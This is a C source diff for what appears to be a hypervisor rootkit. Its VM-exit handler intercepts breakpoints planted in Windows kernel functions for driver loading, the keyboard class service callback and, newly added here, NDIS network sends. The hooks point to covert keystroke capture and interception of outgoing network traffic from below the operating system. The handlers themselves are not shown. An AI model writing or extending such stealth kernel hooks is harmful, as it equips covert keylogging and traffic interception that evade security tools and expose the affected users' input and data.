@@ -6,7 +6,10 @@
 #include <hardware/apic.h>
 #include <lib/msr.h>
 #include <lib/util.h>
-#include <hooks/keyboard.h>
+#include <hooks/hooking.h> 
+#include <hooks/keyboard.h> 
+#include <hooks/ndis.h> 
+
 
 #define LOWER_DWORD(x) ((x) & 0xffffffffull)
 #define LOWER_WORD(x) ((x) & 0xffffull)
@@ -46,7 +49,7 @@ void __attribute__((section(".vmm"))) vmexit_handler(){
     if (state.vmx_error)
         LOG_ERROR("VMX ERROR %d\n", state.vmx_error);
 
-    if (state.exit_reason == 0 && state.interruption_info.valid && state.interruption_info.vector == 3){
+    if (state.exit_reason == 0 && state.interruption_info.valid && state.interruption_info.vector == INT3){
         if (__vmread(GUEST_RIP) == shared_cores_data.ntoskrnl + NTOSKRNL_MiDriverLoadSucceeded_OFFSET){
             handle_MiDriverLoadSucceeded_hook(&state);
             __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
@@ -54,6 +57,11 @@ void __attribute__((section(".vmm"))) vmexit_handler(){
         }
         else if (__vmread(GUEST_RIP) == shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET){
             handle_KeyboardClassServiceCallback_hook(&state);
+            __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
+            return;
+        }
+        else if (__vmread(GUEST_RIP) == shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET){
+            handle_NdisSendNetBufferLists_hook(&state);
             __vmwrite(GUEST_RIP, __vmread(GUEST_RIP)+(qword_t)state.instr_length);
             return;
         }
@@ -95,7 +103,7 @@ void __attribute__((section(".vmm"))) vmexit_handler(){
             #endif
             value = __rdmsr(msr);
             state.registers->rdx = (state.registers->rdx>>32<<32) | value >> 32;
-            state.registers->rax = LOWER_DWORD(value);
+            state.registers->rax = (state.registers->rax>>32<<32) | LOWER_DWORD(value);
             break;
         case EXIT_REASON_CPUID:
             #if DEBUG_VMEXITS
